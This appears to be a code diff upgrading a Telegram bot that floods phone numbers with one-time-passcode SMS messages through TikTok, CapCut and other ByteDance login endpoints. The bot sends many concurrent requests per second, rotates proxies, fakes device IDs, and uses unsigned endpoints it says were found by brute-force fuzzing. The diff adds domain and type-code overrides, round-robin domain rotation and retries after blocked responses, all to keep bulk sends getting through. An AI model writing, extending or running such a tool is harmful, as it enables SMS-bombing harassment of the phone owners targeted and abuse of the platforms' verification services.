@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v10.0
+ByteDance Multi-App OTP Telegram Bot - Ultra Fast Edition v11.0
 ===============================================================
 Features:
 1. 5-10 Concurrent OTP Requests Per Second
@@ -477,12 +477,13 @@ BYTEDANCE_APPS = {
     },
     # ======== MEGA FUZZER DISCOVERED (Phase 3 — AID 1-10000 brute force) ========
     "bd_2239": {
-        # CONFIRMED SUCCESS: www.tiktok.com tc=3532 reg=AU — NEW AID!
+        # CONFIRMED SUCCESS: tiktok.com/capcut.com web endpoint — NEW AID!
+        # Note: www.tiktok.com sometimes returns HTML with tc=3532 — tc=3635 is most reliable
         "name": "ByteDance 2239 (No-Sign)", "aid": 2239, "app_name": "tiktok_web",
         "package": "tiktok_web", "version_code": "1", "version_name": "1.0",
         "channel": "tiktok_web",
-        "type_codes": [3532, 3635, 3637, 3634],
-        "domains": ["www.tiktok.com", "us.tiktok.com", "www.capcut.com", "shop.tiktok.com"],
+        "type_codes": [3635, 3532, 3637, 3634],
+        "domains": ["us.tiktok.com", "www.capcut.com", "www.tiktok.com", "shop.tiktok.com"],
         "needs_proxy": True, "web_endpoint": True,
     },
     "bd_259": {
@@ -851,6 +852,8 @@ class ByteDanceOTPSender:
         rticket = str(timestamp * 1000 + random.randint(1000, 9999))
         params = self._build_common_params(config)
         if type_code is None:
+            type_code = getattr(self, '_override_tc', None)
+        if type_code is None:
             codes = self.app.get("type_codes") or [self.app.get("type_code", 3635)]
             type_code = random.choice(codes)
         params.update({
@@ -909,9 +912,9 @@ class ByteDanceOTPSender:
         """Web-based OTP send — NO signing, NO device registration needed!"""
         start_time = time.time()
         encrypted = self._encrypt_phone(phone)
-        domain = random.choice(self.app["domains"])
+        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
         codes = self.app.get("type_codes") or [3635]
-        tc = random.choice(codes)
+        tc = getattr(self, '_override_tc', None) or random.choice(codes)
 
         body = urlencode({
             "mobile": encrypted, "type": str(tc),
@@ -943,6 +946,32 @@ class ByteDanceOTPSender:
                 result["phone"] = phone
                 return result
             except json.JSONDecodeError:
+                # Server returned HTML instead of JSON — retry with different domain/tc
+                other_domains = [d for d in self.app["domains"] if d != domain]
+                if other_domains:
+                    retry_domain = random.choice(other_domains)
+                    retry_tc = random.choice([c for c in codes if c != tc] or codes)
+                    retry_body = urlencode({
+                        "mobile": encrypted, "type": str(retry_tc),
+                        "aid": str(self.app["aid"]), "app_name": self.app["app_name"],
+                        "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0",
+                    })
+                    retry_url = f"https://{retry_domain}/passport/web/send_code/?aid={self.app['aid']}&app_name={self.app['app_name']}"
+                    retry_headers = dict(headers)
+                    retry_headers["Host"] = retry_domain
+                    retry_headers["Origin"] = f"https://{retry_domain}"
+                    retry_headers["Referer"] = f"https://{retry_domain}/"
+                    try:
+                        r2 = session.post(retry_url, data=retry_body, headers=retry_headers, verify=False, timeout=REQUEST_TIMEOUT)
+                        result = r2.json()
+                        result["success"] = result.get("message") == "success"
+                        result["proxy_used"] = proxy or "Direct"
+                        result["method"] = "web_unsigned_retry"
+                        result["domain"] = retry_domain
+                        result["time_ms"] = (time.time() - start_time) * 1000
+                        result["phone"] = phone
+                        return result
+                    except Exception: pass
                 return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
         except requests.exceptions.RequestException as e:
             elapsed = (time.time() - start_time) * 1000
@@ -954,9 +983,9 @@ class ByteDanceOTPSender:
         """Mobile endpoint WITHOUT signatures — works on tiktokv.com domains!"""
         start_time = time.time()
         encrypted = self._encrypt_phone(phone)
-        domain = random.choice(self.app["domains"])
+        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
         codes = self.app.get("type_codes") or [3635]
-        tc = random.choice(codes)
+        tc = getattr(self, '_override_tc', None) or random.choice(codes)
         timestamp = int(time.time())
         device_id = str(random.randint(10**15, 10**16-1))
         iid = str(random.randint(10**15, 10**16-1))
@@ -1008,11 +1037,16 @@ class ByteDanceOTPSender:
         finally:
             session.close()
 
-    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
+    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None,
+                      override_domain: Optional[str] = None, override_tc: Optional[int] = None) -> Dict:
         """Synchronous OTP send - Routes to appropriate method based on app config"""
         phone = phone_number.strip().replace(" ", "").replace("-", "")
         if not phone.startswith("+"):
             phone = "+" + phone
+
+        # Store overrides for use in sub-methods
+        self._override_domain = override_domain
+        self._override_tc = override_tc
 
         # Route to web endpoint if configured (no signing needed)
         if self.app.get("web_endpoint"):
@@ -1041,8 +1075,8 @@ class ByteDanceOTPSender:
         except Exception as e:
             return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
 
-        # Randomize domain per request for freshness / load-balancing
-        domain = random.choice(self.app["domains"])
+        # Use override domain if set, otherwise randomize
+        domain = getattr(self, '_override_domain', None) or random.choice(self.app["domains"])
         headers = self._build_headers(config, cookies, timestamp, signatures, body, domain)
         # Use alt_endpoint randomly if available (e.g. /passport/mobile/send_code/ without v1)
         endpoint = self.ENDPOINT
@@ -1498,7 +1532,10 @@ async def send_message_safe(context: ContextTypes.DEFAULT_TYPE, chat_id: str, te
 # ASYNC OTP WRAPPER
 # ============================================
 
-async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore, app_key: str = DEFAULT_APP) -> Dict:
+async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore,
+                         app_key: str = DEFAULT_APP,
+                         override_domain: Optional[str] = None,
+                         override_tc: Optional[int] = None) -> Dict:
     """Send OTP asynchronously using thread pool"""
     async with semaphore:
         loop = asyncio.get_event_loop()
@@ -1508,7 +1545,8 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
         sender = ByteDanceOTPSender(identity_generator, app_key)
         
         # Run blocking OTP send in thread pool
-        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
+        result = await loop.run_in_executor(
+            thread_pool, sender.send_otp_sync, phone, proxy, override_domain, override_tc)
         
         # Retry on failure
         if not result.get("success"):
@@ -1518,7 +1556,8 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
             if any(kw in error_desc for kw in limit_keywords):
                 proxy = random.choice(proxies) if proxies else None
                 sender2 = ByteDanceOTPSender(identity_generator, app_key)
-                result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
+                result = await loop.run_in_executor(
+                    thread_pool, sender2.send_otp_sync, phone, proxy, override_domain, override_tc)
         
         await global_stats.increment(result.get("success", False))
         result["app"] = app_key
@@ -1566,7 +1605,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     msg = f"""
-ðŸš€ <b>ByteDance Multi-App OTP Bot v10.0</b>
+ðŸš€ <b>ByteDance Multi-App OTP Bot v11.0</b>
 
 âš¡ <b>Performance:</b>
 â€¢ 5-10 Concurrent OTP/Second
@@ -1681,20 +1720,31 @@ async def apps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def setapp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Switch active ByteDance app for OTP"""
+    """Switch active ByteDance app — shows inline buttons if no args"""
     user_id = update.effective_user.id
-    if not context.args:
-        await apps_command(update, context)
+    if context.args:
+        app_key = context.args[0].lower()
+        if app_key not in BYTEDANCE_APPS:
+            available = ', '.join(BYTEDANCE_APPS.keys())
+            await update.message.reply_text(f'Unknown app: <code>{app_key}</code>\nAvailable: {available}', parse_mode='HTML')
+            return
+        # Show domain selection for this app
+        await _show_domain_buttons(update.message, user_id, app_key, "setapp")
         return
-    app_key = context.args[0].lower()
-    if app_key not in BYTEDANCE_APPS:
-        available = ', '.join(BYTEDANCE_APPS.keys())
-        await update.message.reply_text(f'Unknown app: <code>{app_key}</code>\nAvailable: {available}\nUse <code>/apps</code> to see all.', parse_mode='HTML')
-        return
-    user_states[user_id]['app'] = app_key
-    app = BYTEDANCE_APPS[app_key]
-    method = "🌐 Web (no signing)" if app.get("web_endpoint") else "📱 Unsigned mobile" if app.get("unsigned_mobile") else "🔐 Signed mobile"
-    await update.message.reply_text(f'<b>App switched to:</b> {app["name"]}\nAID: {app["aid"]} | Domain: {app["domains"][0]}\nMethod: {method}', parse_mode='HTML')
+    # No args — show app buttons
+    keyboard = []
+    row = []
+    for key, app in BYTEDANCE_APPS.items():
+        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "🔐"
+        btn_text = f"{method} {key} ({app['aid']})"
+        row.append(InlineKeyboardButton(btn_text, callback_data=f"sa|{key}"))
+        if len(row) == 2:
+            keyboard.append(row)
+            row = []
+    if row:
+        keyboard.append(row)
+    await update.message.reply_text("<b>Select App:</b>", parse_mode='HTML',
+                                    reply_markup=InlineKeyboardMarkup(keyboard))
 
 
 async def apps2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1711,28 +1761,72 @@ async def apps2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def setapp2_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Switch to a CONFIRMED SUCCESS app (exact tested combos only)"""
+    """Switch to a CONFIRMED SUCCESS app — shows inline buttons if no args"""
     user_id = update.effective_user.id
-    if not context.args:
-        await apps2_command(update, context)
+    if context.args:
+        app_key = context.args[0].lower()
+        if app_key in CONFIRMED_APPS:
+            await _show_domain_buttons(update.message, user_id, app_key, "setapp2")
+        else:
+            available = ', '.join(CONFIRMED_APPS.keys())
+            await update.message.reply_text(f'Unknown confirmed app: <code>{app_key}</code>\nAvailable: {available}', parse_mode='HTML')
         return
-    app_key = context.args[0].lower()
-    # Check in CONFIRMED_APPS first, then fallback to BYTEDANCE_APPS
-    if app_key in CONFIRMED_APPS:
-        user_states[user_id]['app'] = app_key
-        app = CONFIRMED_APPS[app_key]
-        method = "🌐 Web (no signing)" if app.get("web_endpoint") else "📱 Unsigned mobile" if app.get("unsigned_mobile") else "🔐 Signed mobile"
-        await update.message.reply_text(
-            f'<b>App switched to (CONFIRMED):</b> {app["name"]}\n'
-            f'AID: {app["aid"]} | Domain: {app["domains"][0]}\n'
-            f'Method: {method}\n'
-            f'Type codes: {app["type_codes"]}\n'
-            f'<b>Best proxy regions:</b> AU, DE, SG',
-            parse_mode='HTML'
-        )
+    # No args — show confirmed app buttons
+    keyboard = []
+    row = []
+    for key, app in CONFIRMED_APPS.items():
+        method = "🌐" if app.get("web_endpoint") else "📱" if app.get("unsigned_mobile") else "🔐"
+        btn_text = f"{method} {key} ({app['aid']})"
+        row.append(InlineKeyboardButton(btn_text, callback_data=f"sa2|{key}"))
+        if len(row) == 2:
+            keyboard.append(row)
+            row = []
+    if row:
+        keyboard.append(row)
+    await update.message.reply_text("<b>Select Confirmed App:</b>", parse_mode='HTML',
+                                    reply_markup=InlineKeyboardMarkup(keyboard))
+
+
+async def _show_domain_buttons(msg_or_query, user_id, app_key, source):
+    """Show domain selection inline buttons for an app"""
+    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
+    if not app:
+        return
+    user_states[user_id]['_pending_app'] = app_key
+    user_states[user_id]['_pending_source'] = source
+    domains = app.get("domains", [])
+    keyboard = []
+    for i, domain in enumerate(domains):
+        short = domain[:35] + "..." if len(domain) > 38 else domain
+        keyboard.append([InlineKeyboardButton(f"🌐 {short}", callback_data=f"dom|{i}")])
+    keyboard.append([InlineKeyboardButton("✅ Choose All Domains (round-robin)", callback_data="dom|all")])
+    text = f"<b>{app['name']} (AID={app['aid']})</b>\n\nSelect domain:"
+    if hasattr(msg_or_query, 'edit_message_text'):
+        await msg_or_query.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
     else:
-        available = ', '.join(CONFIRMED_APPS.keys())
-        await update.message.reply_text(f'Unknown confirmed app: <code>{app_key}</code>\nAvailable: {available}\nUse <code>/apps2</code> to see all.', parse_mode='HTML')
+        await msg_or_query.reply_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
+
+
+async def _show_tc_buttons(query, user_id):
+    """Show type code selection inline buttons"""
+    app_key = user_states[user_id].get('_pending_app')
+    app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
+    if not app:
+        return
+    codes = app.get("type_codes", [3635])
+    keyboard = []
+    row = []
+    for tc in codes:
+        row.append(InlineKeyboardButton(str(tc), callback_data=f"tc|{tc}"))
+        if len(row) == 3:
+            keyboard.append(row)
+            row = []
+    if row:
+        keyboard.append(row)
+    keyboard.append([InlineKeyboardButton("📝 Custom Type Code", callback_data="tc|custom")])
+    domain_info = user_states[user_id].get('_pending_domain_display', 'All Domains')
+    text = f"<b>{app['name']} (AID={app['aid']})</b>\nDomain: {domain_info}\n\nSelect type code:"
+    await query.edit_message_text(text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
 
 
 async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2128,6 +2222,81 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML"
         )
 
+    # ---- SETAPP INLINE FLOW ----
+    elif data.startswith("sa|"):
+        # App selected from /setapp inline buttons
+        app_key = data.split("|", 1)[1]
+        user_id = query.from_user.id
+        await _show_domain_buttons(query, user_id, app_key, "setapp")
+
+    elif data.startswith("sa2|"):
+        # App selected from /setapp2 inline buttons
+        app_key = data.split("|", 1)[1]
+        user_id = query.from_user.id
+        await _show_domain_buttons(query, user_id, app_key, "setapp2")
+
+    elif data.startswith("dom|"):
+        # Domain selected
+        user_id = query.from_user.id
+        app_key = user_states[user_id].get('_pending_app')
+        app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
+        if not app:
+            await query.edit_message_text("Error: app not found", parse_mode='HTML')
+            return
+        dom_val = data.split("|", 1)[1]
+        if dom_val == "all":
+            user_states[user_id]['_pending_selected_domain'] = None
+            user_states[user_id]['_pending_domain_mode'] = 'all'
+            user_states[user_id]['_pending_domain_display'] = '✅ All Domains (round-robin)'
+        else:
+            idx = int(dom_val)
+            domains = app.get("domains", [])
+            if idx < len(domains):
+                user_states[user_id]['_pending_selected_domain'] = domains[idx]
+                user_states[user_id]['_pending_domain_mode'] = 'single'
+                user_states[user_id]['_pending_domain_display'] = domains[idx]
+            else:
+                user_states[user_id]['_pending_selected_domain'] = None
+                user_states[user_id]['_pending_domain_mode'] = 'all'
+                user_states[user_id]['_pending_domain_display'] = '✅ All Domains (round-robin)'
+        # Show type code selection
+        await _show_tc_buttons(query, user_id)
+
+    elif data.startswith("tc|"):
+        # Type code selected
+        user_id = query.from_user.id
+        tc_val = data.split("|", 1)[1]
+        app_key = user_states[user_id].get('_pending_app')
+        app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
+        if not app:
+            await query.edit_message_text("Error: app not found", parse_mode='HTML')
+            return
+        if tc_val == "custom":
+            user_states[user_id]['awaiting'] = 'custom_tc'
+            await query.edit_message_text(
+                f"<b>{app['name']}</b>\n\n📝 Enter custom type code (number):",
+                parse_mode='HTML')
+            return
+        tc = int(tc_val)
+        # Commit all selections atomically
+        user_states[user_id]['app'] = app_key
+        user_states[user_id]['selected_tc'] = tc
+        user_states[user_id]['selected_domain'] = user_states[user_id].get('_pending_selected_domain')
+        user_states[user_id]['domain_mode'] = user_states[user_id].get('_pending_domain_mode', 'all')
+        domain_display = user_states[user_id].get('_pending_domain_display', 'Random')
+        domain_mode = user_states[user_id].get('domain_mode', 'all')
+        method = "🌐 Web" if app.get("web_endpoint") else "📱 Unsigned" if app.get("unsigned_mobile") else "🔐 Signed"
+        confirmed = " (CONFIRMED)" if app_key in CONFIRMED_APPS else ""
+        await query.edit_message_text(
+            f"✅ <b>App configured{confirmed}:</b>\n\n"
+            f"📱 App: {app['name']} (AID={app['aid']})\n"
+            f"🌐 Domain: {domain_display}\n"
+            f"🔢 Type Code: {tc}\n"
+            f"⚙️ Method: {method}\n"
+            f"🔄 Mode: {'Round-robin all domains' if domain_mode == 'all' else 'Single domain'}\n\n"
+            f"<b>Ready!</b> Use /single +number or /bulk",
+            parse_mode='HTML')
+
 
 # ============================================
 # OTP PROCESSING - ULTRA FAST
@@ -2147,9 +2316,12 @@ async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE,
     
     # Use thread pool for blocking operation with user's selected app
     app_key = user_states[user_id].get('app', DEFAULT_APP)
+    override_domain = user_states[user_id].get('selected_domain')
+    override_tc = user_states[user_id].get('selected_tc')
     loop = asyncio.get_event_loop()
     sender = ByteDanceOTPSender(identity_generator, app_key)
-    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
+    result = await loop.run_in_executor(
+        thread_pool, sender.send_otp_sync, phone_num, proxy, override_domain, override_tc)
     
     await global_stats.increment(result.get("success", False))
     
@@ -2180,6 +2352,9 @@ async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, nu
     task_id = await task_manager.create_task(numbers, proxies, chat_id)
     task = task_manager.get_task(task_id)
     task.app_key = user_states[user_id].get('app', DEFAULT_APP)
+    task.override_domain = user_states[user_id].get('selected_domain')
+    task.override_tc = user_states[user_id].get('selected_tc')
+    task.domain_mode = user_states[user_id].get('domain_mode', 'single')
     task.status = "running"
     task_manager.running_tasks.add(task_id)
     
@@ -2198,8 +2373,13 @@ async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, nu
 
 async def start_bulk_task_from_callback(context: ContextTypes.DEFAULT_TYPE, query, numbers: List[str], proxies: List[str]):
     chat_id = str(query.message.chat_id)
+    user_id = query.from_user.id
     task_id = await task_manager.create_task(numbers, proxies, chat_id)
     task = task_manager.get_task(task_id)
+    task.app_key = user_states[user_id].get('app', DEFAULT_APP)
+    task.override_domain = user_states[user_id].get('selected_domain')
+    task.override_tc = user_states[user_id].get('selected_tc')
+    task.domain_mode = user_states[user_id].get('domain_mode', 'single')
     task.status = "running"
     task_manager.running_tasks.add(task_id)
     
@@ -2274,11 +2454,24 @@ async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Tas
         batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
         batch = task.phone_numbers[batch_start:batch_end]
         
-        # Create concurrent tasks for this batch
-        tasks = [
-            send_otp_async(phone, task.proxies, semaphore, task.app_key)
-            for phone in batch
-        ]
+        # Create concurrent tasks for this batch with domain/tc overrides
+        concurrent_tasks = []
+        for i, phone in enumerate(batch):
+            phone_index = batch_start + i
+            override_domain = getattr(task, 'override_domain', None)
+            override_tc = getattr(task, 'override_tc', None)
+            domain_mode = getattr(task, 'domain_mode', 'single')
+            # Round-robin domain distribution when "all domains" selected
+            if domain_mode == 'all' and not override_domain:
+                app = CONFIRMED_APPS.get(task.app_key) or BYTEDANCE_APPS.get(task.app_key)
+                if app:
+                    domains = app.get("domains", [])
+                    if domains:
+                        override_domain = domains[phone_index % len(domains)]
+            concurrent_tasks.append(
+                send_otp_async(phone, task.proxies, semaphore, task.app_key,
+                              override_domain, override_tc))
+        tasks = concurrent_tasks
         
         # Execute all concurrently
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -2545,6 +2738,33 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['proxies_buffer'].extend(new_proxies)
         count = len(user_states[user_id]['proxies_buffer'])
         await update.message.reply_text(f"ðŸ“¥ +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
+    
+    elif awaiting == 'custom_tc':
+        user_states[user_id]['awaiting'] = None
+        try:
+            tc = int(text.strip())
+            app_key = user_states[user_id].get('_pending_app')
+            # Commit all selections atomically
+            if app_key:
+                user_states[user_id]['app'] = app_key
+            user_states[user_id]['selected_tc'] = tc
+            user_states[user_id]['selected_domain'] = user_states[user_id].get('_pending_selected_domain')
+            user_states[user_id]['domain_mode'] = user_states[user_id].get('_pending_domain_mode', 'all')
+            app = CONFIRMED_APPS.get(app_key) or BYTEDANCE_APPS.get(app_key)
+            domain_display = user_states[user_id].get('_pending_domain_display', 'Random')
+            domain_mode = user_states[user_id].get('domain_mode', 'all')
+            name = app['name'] if app else app_key
+            aid = app['aid'] if app else '?'
+            await update.message.reply_text(
+                f"✅ <b>App configured:</b>\n\n"
+                f"📱 App: {name} (AID={aid})\n"
+                f"🌐 Domain: {domain_display}\n"
+                f"🔢 Type Code: {tc} (custom)\n"
+                f"🔄 Mode: {'Round-robin all domains' if domain_mode == 'all' else 'Single domain'}\n\n"
+                f"<b>Ready!</b> Use /single +number or /bulk",
+                parse_mode='HTML')
+        except ValueError:
+            await update.message.reply_text("❌ Invalid type code. Enter a number.", parse_mode='HTML')
     
     elif awaiting == 'single_phone':
         user_states[user_id]['awaiting'] = None
